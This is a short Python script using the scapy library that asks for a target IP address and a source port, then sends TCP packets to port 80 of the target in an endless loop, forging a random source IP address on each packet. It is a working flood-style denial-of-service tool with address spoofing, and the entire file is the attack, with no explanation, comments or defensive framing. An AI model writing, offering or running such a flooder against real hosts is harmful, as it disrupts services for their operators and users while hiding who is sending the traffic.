from scapy.layers.inet import IP, TCP, random
from scapy.all import send

target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."

    source_IP = a + dot + b + dot + c + dot + d
    IP1 = IP(src=source_IP, dst=target_IP)
    TCP1 = TCP(sport=source_port, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=0.001)
    print("packet sent ", i)
    i += 1
